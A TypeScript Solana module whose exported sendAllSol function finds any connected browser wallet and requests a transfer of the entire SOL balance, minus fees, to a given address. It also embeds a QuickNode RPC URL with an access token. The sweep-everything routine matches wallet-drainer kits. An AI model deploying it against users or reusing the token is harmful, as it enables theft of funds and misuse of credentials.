import { Connection, PublicKey, Transaction, SystemProgram, ComputeBudgetProgram } from '@solana/web3.js';

const RPC_ENDPOINTS = [
  "https://polished-magical-bridge.solana-mainnet.quiknode.pro/a04ccce94da93a2cf477ebd52fcf7a9e70183a15/"
];

async function getOptimalConnection() {
  for (const endpoint of RPC_ENDPOINTS) {
    try {
      const connection = new Connection(endpoint, {
        commitment: 'confirmed',
        disableRetryOnRateLimit: true
      });
      await connection.getEpochInfo(); // Test connection
      return connection;
    } catch (error) {
      console.warn(`RPC ${endpoint} failed, trying next...`);
      continue;
    }
  }
  throw new Error('All RPC endpoints failed');
}

export async function sendAllSol(
  fromPublicKey: string,
  toAddress: string
): Promise<string> {
  const walletProvider = window.phantom?.solana || window.solflare || window.backpack || window.glow;
  if (!walletProvider) throw new Error('Wallet not connected');

  const connection = await getOptimalConnection();
  const pubKey = new PublicKey(fromPublicKey);
  
  // Get balance and recent blockhash
  const [balance, { blockhash, feeCalculator }] = await Promise.all([
    connection.getBalance(pubKey),
    connection.getRecentBlockhash()
  ]);

  // Calculate max transfer amount (leave enough for fees)
  const fee = feeCalculator.lamportsPerSignature * 2; // Buffer for 2 signatures
  const sendAmount = balance - fee;

  if (sendAmount <= 0) {
    throw new Error(`Insufficient balance (need ${fee / 1e9} SOL for fees)`);
  }

  // Build transaction
  const tx = new Transaction({
    feePayer: pubKey,
    recentBlockhash: blockhash
  });

  // Add priority fee if needed (adjust based on network congestion)
  tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));

  tx.add(
    SystemProgram.transfer({
      fromPubkey: pubKey,
      toPubkey: new PublicKey(toAddress),
      lamports: sendAmount
    })
  );

  // Sign and send
  const signedTx = await walletProvider.signTransaction(tx);
  return connection.sendRawTransaction(signedTx.serialize(), {
    skipPreflight: false, // Better success rate
    preflightCommitment: 'confirmed'
  });
}